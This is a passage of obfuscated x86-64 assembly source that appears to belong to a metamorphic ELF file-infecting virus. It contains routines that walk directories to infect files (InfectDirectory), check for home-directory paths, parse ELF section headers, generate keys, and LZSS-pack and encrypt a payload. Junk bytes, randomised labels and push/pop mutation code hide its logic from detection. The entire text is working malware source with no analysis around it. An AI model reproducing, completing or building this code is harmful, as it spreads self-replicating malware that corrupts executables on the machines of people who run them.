    pop         r2
    cmp         rax, 0x00
    mjmp        ..@NC9pjqMbBS8X
db 0xef, 0xc5, 0x11
..@NC9pjqMbBS8X:
    mjmp        ..@dqP5t6p9T9sf
db 0xf1
..@dqP5t6p9T9sf:
    mjmp        ..@K5WAU6lNp2sA
..@B1o4WTKPHMfV:
    mov         DWORD [rdi+1], edx
    mjmp        ..@bmfh2uMBv8EQ
..@TDXhdSg8CWJf:
    ret
    mjmp        ..@cC9iKCxzPZTN
db 0x3a, 0x23
..@cC9iKCxzPZTN:
    mjmp        ConvertMoveToPushPop
..@pIceAsp73FOr:
    xchg        rdi, rdi
    mov         dl, BYTE [rsi]
    push        rsi
    pop         rsi
    mov         bl, dl
    mjmp        ..@fC0R40ruGl8p
..@M8XOSaiDAPWx:
    mov         QWORD m5, 0x01
    push        rax
    pop         rax
    mjmp        ..@603uhgXht7RJ
db 0x28
..@603uhgXht7RJ:
    mjmp        ..@lITlgPb0y8pY
..@wZSGrS0MviNH:
%ifdef X86_32
    movr        edi, r1
    movr        esi, r2
    movr        ecx, r3
%endif
    mjmp        ..@FqmzKMP82YoJ
db 0xaf, 0x19
..@FqmzKMP82YoJ:
    mjmp        ..@dQLOoM6iIRMP
..@TlIGPMnNZYuK:
    movr        rsi, rsi
    mov         r2, vsp
    movv        r3, non_packed_len
    mjmp        ..@G6JqaFgnKYHz
db 0x3d, 0xef, 0xb5
..@G6JqaFgnKYHz:
    mjmp        ..@tOsGmrmyXKi8
..@ht9wdsBYmny0:
    OFILE       [r1], 0x10000
    xchg        rsi, rsi
    cmp         eax, 0x03
    jl          ..@lDSCB9LEhdLA
    mjmp        ..@2E9X36OkzVga
..@A0qASmADG2qb:
    cmp         dl, 0fh
    mjmp        ..@EAMGDXZ2syyg
db 0x96, 0x49
..@EAMGDXZ2syyg:
    mjmp        ..@TN6RTbMbZBm0
..@79RNslnZRGGb:
    push        rbx
    pop         rbx
    cmp         rax, 0x00
    jle         ..@5YI8VQKtr0HY
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    mjmp        ..@CkdAoNMVCkdF
db 0xfb
..@CkdAoNMVCkdF:
    mjmp        ..@2tj3EJlMyB7w
db 0xb7
..@2tj3EJlMyB7w:
    mjmp        ..@uQlomUjDXOa5
..@uKGIrVuDR4H4:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@MxuxXWS6AO4u
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    xor         rax, rax
    mjmp        ..@uFWv8Xe0ptJg
..@FoxzIsab9LFD:
    xchg        rsi, rsi
    add         r1, 2
    xchg        rsp, rsp
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    mjmp        ..@2Cdlon9HdeCl
db 0xe0
..@2Cdlon9HdeCl:
    mjmp        ..@1QTNc9nNUB7X
..@G3JUopmA2zpZ:
    jnz         ..@icuKMk8rToL9
    push        rax
    pop         rax
    movv        rax, 1
    mjmp        ..@eb7mrv3p1gFY
..@CueMqoAKNPOz:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    movr        rsi, rdi
    mjmp        ..@27l4BZmQ6uxq
db 0xff, 0x65
..@27l4BZmQ6uxq:
    mjmp        ..@hy0FS3B0yUdB
..@b6HoosnNjrTE:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    mjmp        ..@4t4ctNaSRpEF
..@3udnhuRgykjV:
    xor         rsi, rsi
    mjmp        ..@A9C4DonBw7sV
..@4nyIjzGNETIx:
    xor         rdi, rdi
    mjmp        ..@FtPMXWScDzOD
db 0xfe
..@FtPMXWScDzOD:
    mjmp        ..@0QRrhenGHFrI
..@vyDfYymmco3R:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    movr        r1, r5
%endif
    mjmp        ..@E6rSYFNvn16K
db 0xf5, 0x4c
..@E6rSYFNvn16K:
    mjmp        ..@LZTb859rcH9n
..@IFdIITln0oO8:
    xchg        rsp, rsp
    mjmp        ..@8ujmAsyvzOB2
..@HqfRghkZn1SG:
    jl          ..@tTigU9uPJbPQ
    mjmp        ..@uCj26GLudvZM
..@ZoTNQMQ6JR1B:
    call        FileValidation
    mjmp        ..@WtdLKif3VUsZ
db 0x06
..@WtdLKif3VUsZ:
    mjmp        ..@1CZ3IueVjGPO
..@AEWfiR4mgAWi:
    xor         rdx, rdx
    mov         edx, DWORD [rdi]
    xor         rbx, rbx
    xor         rcx, rcx
    movv        rbx, 909090c0h
    mjmp        ..@TJRkfu5q8ZTo
..@jFgkwvIn75IU:
    cmp         DWORD [r1+1], "home"
    jne         ..@icuKMk8rToL9
    cmp         BYTE [r1+5], '/'
    mjmp        ..@gL7MfDoo4Qxt
NonBinaryFile:
    mjmp        ..@r1zEGOG1Ou2a
..@bgEz2bW7VaPn:
    xor         rdx, rdx
    mjmp        ..@kEiOTIGSU7Gt
..@l5cvn66dLLll:
%ifdef X86_64
    shr         ebx, 16
%endif
    mjmp        ..@rLo2dARuteiM
db 0x25, 0x42, 0xcb
..@rLo2dARuteiM:
    mjmp        ..@yR088lXaEQ7X
..@DPo93hnTxUDX:
    pop         rcx
    mjmp        ..@9aXNGDEakMnk
db 0x9a, 0x99, 0x01
..@9aXNGDEakMnk:
    mjmp        ..@lmCQd3OHjxUg
..@1SdyWudny4wf:
    push        rdx
    mjmp        ..@N7dZo5n5gYaK
db 0xd8, 0x27
..@N7dZo5n5gYaK:
    mjmp        ..@bv1URoY7jayW
..@OUmKz6suixym:
    pop         r4
    mjmp        ..@RRQyuaOu8kb5
db 0x32, 0x15, 0xd7
..@RRQyuaOu8kb5:
    mjmp        ..@4tyKpD1zwiRL
db 0xa7, 0xb3, 0xf3
..@4tyKpD1zwiRL:
    mjmp        ..@6BxfUWTxQii0
..@aJIxCIX0ozKf:
    call        KeyGen
    xchg        rcx, rcx
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    movr        rsp, rsp
    mjmp        ..@bYeXSCYPTJtR
..@DmRpd3Pf49Qw:
    xchg        rsi, rsi
    mjmp        ..@421KLfugpx0g
db 0xb4
..@421KLfugpx0g:
    mjmp        ..@7FeovylhQifn
..@H5QiZM7gIijK:
    movr        r5, r1
    movr        r1, r4
    mjmp        ..@YQGNht7QjK7o
db 0x0a, 0x39, 0xdf
..@YQGNht7QjK7o:
    mjmp        ..@mmyHlI2iJ8Rx
..@AFIrPTt5Bnhe:
    add         rdi, 0x4
    mjmp        ..@sQX9MJdPnBSV
..@BRnWcLa8gwSc:
    movr        rbp, rbp
    mjmp        ..@Zzw0PMjgKbDR
..@3GJSD0s9SNvd:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    push        rdi
    pop         rdi
    movr        rdi, rdi
    rep         movsb
    mjmp        ..@g9j7LS45nojR
db 0xe2, 0x12
..@g9j7LS45nojR:
    mjmp        ..@FFWhQHEorskh
..@geIfEUr4P1yF:
    xchg        rdi, rdi
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    rep         nop
    sub         r1, r4
    mjmp        ..@XX5n0blqSyWQ
..@s2QKHBuDlNRc:
    cmp         rdi, rsi
    mjmp        ..@5sOdffczxMDx
db 0x00, 0xb7
..@5sOdffczxMDx:
    mjmp        ..@mFNVfr5saTuG
db 0xfe, 0x99
..@mFNVfr5saTuG:
    mjmp        ..@nRyi8LzjjJ7X
..@sda5mtGEjW1u:
    test        eax, eax
    mjmp        ..@WBuUfK018z3Z
db 0x0d, 0x6e
..@WBuUfK018z3Z:
    mjmp        ..@iIKTdnPPiXYa
..@3HXyEiOk0Vna:
%ifdef X86_64
    je          ..@p1TRtLd8XYZN
    mov         edx, DWORD [rdi]
    xchg        rdi, rdi
%endif
    mjmp        ..@VRe1yBseYsPq
db 0x2f
..@VRe1yBseYsPq:
    mjmp        ..@DeTpjFLAlI0i
db 0x34, 0xd0, 0x99
..@DeTpjFLAlI0i:
    mjmp        ..@VGBErXxiamib
..@cF5M6T5jYO4g:
    pop         r1
    mov         r2, QWORD [r1+file.filesize]
    mjmp        ..@iZvIRoJOQwsV
..@9V5DbaVvLUmG:
    movr        rsp, rsp
    mjmp        ..@RQQRsRnkVmUR
db 0x9d
..@RQQRsRnkVmUR:
    mjmp        ..@ywv9xhFt61qO
..@srtqq5adyUT8:
    movr        rsi, rsi
    mjmp        ..@GHEZgFuly29e
db 0xaa
..@GHEZgFuly29e:
    mjmp        ..@hy205IHLQKlQ
..@sv9usWZqHVXy:
    mov         r2, m6
    push        rcx
    mjmp        ..@pnXqi2KzYoiH
db 0x0b
..@pnXqi2KzYoiH:
    mjmp        ..@rrFgzY9HgQ9L
..@SoWZNAiFM5Bt:
    je          ..@wxwWfm7MP6qM
    mjmp        ..@wrzFB1eFpIE4
..@UU5xzXYCkbC4:
    jl          ..@FTZ2OtRZ6WGT
    mjmp        ..@IlTWo05lUgyZ
..@Sz1RzWU0Ii7V:
    mjmp        ..@k3tzSSBQTNbC
    mjmp        ..@QJqEM7dLWRc6
ConvertPushPopToMove:
    mjmp        ..@Gz59tpsigK83
..@HAHwd80ZzG2Z:
    syscall
    mjmp        ..@szl6bkv1FvxU
..@5SdYygnzLrUb:
    jne         ..@D6NbMNOj03aJ
    mjmp        ..@mAiVU8z2vA0O
..@WL70SOsH2RmM:
%ifdef X86_64
    test        bl, bl
%endif
    mjmp        ..@HHHly9HEYrzX
..@ZHrx1zDECIsR:
    xchg        rdx, rdx
    xor         r2, r2
    xor         r3, r3
    xchg        rax, rax
    xchg        rsi, rsi
    mjmp        ..@Ue8SKpVl3POZ
db 0x3a, 0xf2, 0x0d
..@Ue8SKpVl3POZ:
    mjmp        ..@gYRSgbi3HT66
..@SgZTFlh0HPlp:
%ifdef X86_32
    je          ..@EuaGjmwM9vTp
    push        rdi
%endif
    mjmp        ..@9uqOGxurstbh
db 0xef
..@9uqOGxurstbh:
    mjmp        ..@ZouOxRNU3rCg
..@49vyDdvrWpWg:
    and         dl, 1110b
    or          dl, 80h
    xchg        rcx, rcx
    shl         edx, 8
    mov         dl, 0fh
    mjmp        ..@SdXHN3C3dsuX
db 0xdd, 0xcd
..@SdXHN3C3dsuX:
    mjmp        ..@xci9BJvsdxGr
..@MBgNxicdq9hB:
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    push        rcx
    mjmp        ..@rgRdrDJmmt4u
..@cAwdiBpo9m2f:
    add         rsi, QWORD [rsp]
    movr        rcx, rdi
    mjmp        ..@ME9rKfvXSobd
..@wQXdDazlAQ62:
    movr        rsp, rsp
    mjmp        ..@HBB9b5m13tgq
..@3mdEmQtzzZp9:
    sub         r2, m6
    sub         r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    mjmp        ..@Zo1DIxJ0mM1g
db 0x4f
..@Zo1DIxJ0mM1g:
    mjmp        ..@aqAkoPCWTNwG
..@2MKZrQennIpk:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    mjmp        ..@woaMGCUT2Jay
db 0xf5, 0x4b, 0x93
..@woaMGCUT2Jay:
    mjmp        ..@IX6ZHFA0YMaa
..@WlfvVz6eU9q5:
    xor         rdx, rdx
    mjmp        ..@s6Tw5HIb0wUV
..@6gfdBSOEWxqk:
    sete        al
    mjmp        ..@RDjdKBoMbiNW
..@DCL39HCJUUAs:
    pop         rdx
    push        rdx
    pop         rdx
    push        rsi
    mjmp        ..@w2x7ndkf3HmP
..@DkNT9VqymcJQ:
    call        ConvertPushPopToMove
    mjmp        ..@61tdojKBVoI3
db 0xda, 0xd9, 0xf3
..@61tdojKBVoI3:
    mjmp        ..@xdTAIzeOlYSz
..@GEjeDitjDxWC:
    mjmp        ..@lQhJ1g2JYUlK
    mjmp        ..@WF2wDWMhA1qE
..@Cpvy5Pp9kGA3:
%ifdef X86_64
    shl         rbx, 8
    push        rbx
    pop         rbx
    mov         bl, 41h
    push        rdi
%endif
    mjmp        ..@TwIZpGTz6MxB
..@lYPJ3SUxIR6l:
    push        rcx
    pop         rcx
    call        DYNPIEValidation
    test        rax, rax
    mjmp        ..@BbU704ija62c
..@6xDTxtMF04Ex:
    push        rax
    pop         rax
    mjmp        ..@vsw6uM53XRra
db 0xb6, 0xab
..@vsw6uM53XRra:
    mjmp        ..@KOFtVaCjZFsQ
..@6Ab7Mjuy0DUH:
%ifndef ENABLE_DEBUGGING
    jl          ..@3eMzvMToLeUr
    movr        r1, rax
    push        rsi
    pop         rsi
    movv        r2, 0x2
%endif
    mjmp        ..@MT1ul7o2e5ao
db 0xc6
..@MT1ul7o2e5ao:
    mjmp        ..@Dm3ZHBwZafgE
..@sEVRFpzAVamI:
    push        rsi
    push        rcx
    movr        rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    mjmp        ..@LObKRoOejxoJ
db 0xcc
..@LObKRoOejxoJ:
    mjmp        ..@PS5ert9KAuI5
db 0xa0
..@PS5ert9KAuI5:
    mjmp        ..@kl1T9f8oElm8
..@26O4PSxDcjPT:
    ret
    mjmp        ..@eI4tLgYxlsAK
db 0x02, 0x0d
..@eI4tLgYxlsAK:
    mjmp        UnmapFile
..@jrcE6Kzu3o47:
    xor         rcx, rcx
    mjmp        ..@hNo8qhq1YUGm
db 0xa0
..@hNo8qhq1YUGm:
    mjmp        ..@hg61IGMbQ4r2
..@O9OJGRmCCJnK:
    movr        rbx, rbx
    mjmp        ..@vvxBEoPvNKrR
..@qdJsRWjAlPsf:
    GGLOBAL     _signature
    movr        r1, r5
    mjmp        ..@34oEBXhgAMzV
db 0xc3
..@34oEBXhgAMzV:
    mjmp        ..@K8SPCits30Ei
..@aGGUL8yJCJ5T:
%ifdef X86_64
    mov         WORD [rsi+rcx], 9090h
    push        rcx
    pop         rcx
%endif
    mjmp        ..@3QQIrdlaKjpn
db 0xfc, 0xff
..@3QQIrdlaKjpn:
    mjmp        ..@9kos1xEDUIKk
..@GG26lLFzJLVF:
    push        rcx
    mjmp        ..@PJ1v2reNm3Yr
db 0x3b, 0x07, 0xa4
..@PJ1v2reNm3Yr:
    mjmp        ..@JEfLumj8oMVj
db 0xc0, 0xcc
..@JEfLumj8oMVj:
    mjmp        ..@rbyi2KI3vyZ4
..@OmLRNsX4PYqh:
%ifdef X86_64
    test        al, al
    jz          ..@XIPcDP4FU8ah
%endif
    mjmp        ..@l3vwmQaYbGDS
db 0xf4
..@l3vwmQaYbGDS:
    mjmp        ..@UuedNn5BLYor
db 0xb6, 0x04
..@UuedNn5BLYor:
    mjmp        ..@UyQUN95dH9lN
..@amSjgXHWBguE:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    mjmp        ..@o7BNyn2WXSFE
..@Adqcpx9t4AiQ:
    movr        rbp, rbp
    add         r2, e_h.e_shoff
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    mjmp        ..@k608RamcjzxC
..@yO1u8EF7eOxu:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    mjmp        ..@MSZ6RuPeqzGm
db 0xf9, 0xec
..@MSZ6RuPeqzGm:
    mjmp        ..@FTZ2OtRZ6WGT
..@oUs5OYXrulC9:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    mjmp        ..@UCCtD8j31FWh
..@aE5jxfQaSfXI:
    pop         rdx
    mjmp        ..@jlznS5kTon15
..@pCCf5TJPeDAt:
    mjmp        ..@Tc8tIxV9F9JB
    mjmp        ..@UvvQFoqMqQWW
db 0x42
..@UvvQFoqMqQWW:
    mjmp        ..@MxuxXWS6AO4u
InfectDirectory:
    mjmp        ..@qyPmQzgphleh
..@FR5vKNiVFMr5:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    mjmp        ..@zDjQxTmXAX76
db 0x1d
..@zDjQxTmXAX76:
    mjmp        ..@9zPUMmU3kSGB

_eof:

